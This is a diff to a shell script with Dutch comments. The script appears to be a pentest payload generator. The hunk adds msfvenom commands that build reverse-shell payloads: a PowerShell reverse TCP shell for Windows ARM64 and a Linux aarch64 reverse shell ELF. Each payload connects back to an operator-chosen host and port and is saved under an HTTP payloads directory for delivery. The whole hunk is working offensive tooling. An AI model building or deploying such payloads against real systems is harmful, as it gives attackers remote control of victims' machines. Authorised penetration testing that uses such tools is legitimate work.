@@ -188,6 +188,20 @@ if command -v msfvenom &>/dev/null; then
        >> http/payloads/${BESTAND}_${PORT}.txt \
     || echo "[!] msfvenom osx/x64/shell_reverse_tcp mislukt" >&2) &
 
+  # ARM64 Windows — pure PowerShell (geen shellcode, arch-onafhankelijk)
+  (msfvenom -p cmd/windows/powershell_reverse_tcp LHOST="${IP}" LPORT="${PORT}" -f raw \
+    > http/payloads/${BESTAND}_ps_${PORT}.ps1 2>/dev/null \
+    && echo "${BESTAND}_ps_${PORT}.ps1 :: cmd/windows/powershell_reverse_tcp LHOST=${IP} LPORT=${PORT} (ARM64-safe)" \
+       >> http/payloads/${BESTAND}_${PORT}.txt \
+    || echo "[!] msfvenom cmd/windows/powershell_reverse_tcp mislukt" >&2) &
+
+  # Linux ARM64 (Raspberry Pi, ARM servers)
+  (msfvenom -p linux/aarch64/shell_reverse_tcp LHOST="${IP}" LPORT="${PORT}" -f elf \
+    > http/payloads/${BESTAND}_arm64_${PORT}.elf 2>/dev/null \
+    && echo "${BESTAND}_arm64_${PORT}.elf :: linux/aarch64/shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f elf" \
+       >> http/payloads/${BESTAND}_${PORT}.txt \
+    || echo "[!] msfvenom linux/aarch64/shell_reverse_tcp mislukt" >&2) &
+
   wait
   echo "[.] msfvenom payloads klaar"
 else
